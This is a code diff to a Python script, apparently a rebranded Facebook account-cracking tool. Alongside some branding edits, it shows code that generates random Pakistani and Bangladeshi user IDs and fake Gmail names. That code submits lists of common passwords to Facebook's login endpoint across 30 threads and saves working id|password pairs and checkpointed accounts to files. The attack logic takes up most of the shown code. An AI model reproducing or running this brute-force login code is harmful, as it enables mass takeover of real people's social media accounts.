@@ -554,12 +554,12 @@ def approval():
       print('\33[1;97m----------------------------------------------')
       print("\33[1;32mImportant Note")
       print("\33[1;97m----------------------------------------------")
-      print("\33[1;97mFirst Joi NSN Group ")
+      print("\33[1;97mFirst Join NSN Group ")
       print('Copy Key and send NSN Owner')
-      print('Command paid its not free')
+      print('Command free Just 1 condition')
       print('\33[1;97m----------------------------------------------')
-      print ('IF U DONT WANT TO BUY PLS DONT PRESS ENTER')
-      input('IF U WANT TO BUY THEN PRESS ENTER ')
+      print ('If You Can Not Accept The Conditions PLS DONT PRESS ENTER')
+      input('IF YOU CAN NOT ACCEPT THE CONDITIONS THEN PRESS ENTER ')
       os.system('xdg-open https://www.facebook.com/LALA.SHERRY.LST110')
       time.sleep(1)
       exit()
@@ -849,7 +849,7 @@ def pak():
                 for nmbr in range(limit):
                         nmp = ''.join(random.choice(string.digits) for _ in range(7))
                         user.append(nmp)
-                with tred(max_workers=30) as Sk:     
+                with tred(max_workers=30) as NSN:     
                         clear()
                         tl = str(len(user))
                         print('Total account : \033[1;32m'+tl)
@@ -858,7 +858,7 @@ def pak():
                         for psx in user:
                                 ids = code+psx
                                 passlist = [psx,ids,'khankhan','khan1122','khan12345','khan1234','khan12','khan786','khan123','khan123456','khankhan123','786786']
-                                Sk.submit(rndm,ids,passlist)
+                                NSN.submit(rndm,ids,passlist)
                 print('\033[1;97m')
                 linex()
                 print(' The process has completed')
@@ -878,7 +878,7 @@ def bd():
                 for nmbr in range(limit):
                         nmp = ''.join(random.choice(string.digits) for _ in range(8))
                         user.append(nmp)
-                with tred(max_workers=30) as Sk:     
+                with tred(max_workers=30) as NSN:     
                         clear()
                         tl = str(len(user))
                         print(' Total account : \033[1;32m'+tl)
@@ -887,7 +887,7 @@ def bd():
                         for psx in user:
                                 ids = code+psx
                                 passlist = [psx,ids,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']
-                                Sk.submit(rndm,ids,passlist)
+                                NSN.submit(rndm,ids,passlist)
                 print('\033[1;97m')
                 linex()
                 print(' The process has completed')
@@ -926,7 +926,7 @@ def gmail():
                                 mail = ''.join(random.choice(string.digits) for _ in range(4))
                                 open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                         fo = open('.re.txt', 'r').read().splitlines()
-                with tred(max_workers=30) as Sk:
+                with tred(max_workers=30) as NSN:
                         total = str(len(fo))
                         clear()
                         print('Total account : \033[1;97m'+total)
@@ -942,7 +942,7 @@ def gmail():
                                 fs = first_name.lower()
                                 ls = last_name.lower()
                                 passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
-                                Sk.submit(rndm,ids,passlist)
+                                NSN.submit(rndm,ids,passlist)
                 print('\033[1;97m')
                 linex()
                 print(' The process has completed')
@@ -973,15 +973,15 @@ def ffb(ids,names,passlist):
                         getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-                        Sk=session.cookies.get_dict().keys()
-                        if "c_user" in Sk:
+                        NSN=session.cookies.get_dict().keys()
+                        if "c_user" in NSN:
                                 coki=session.cookies.get_dict()
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                 print('\r\r\033[1;32m [NAYAN-OK] %s | %s'%(ids,pas))
                                 open('/sdcard/NAYAN-OK-M1.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
-                        elif 'checkpoint' in Sk:
+                        elif 'checkpoint' in NSN:
                                 if 'y' in pcp:
                                         print('\r\033[1;97m [NAYAN-CP] '+ids+' | '+pas+'\033[1;97m')
                                         open('/sdcard/NAYAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
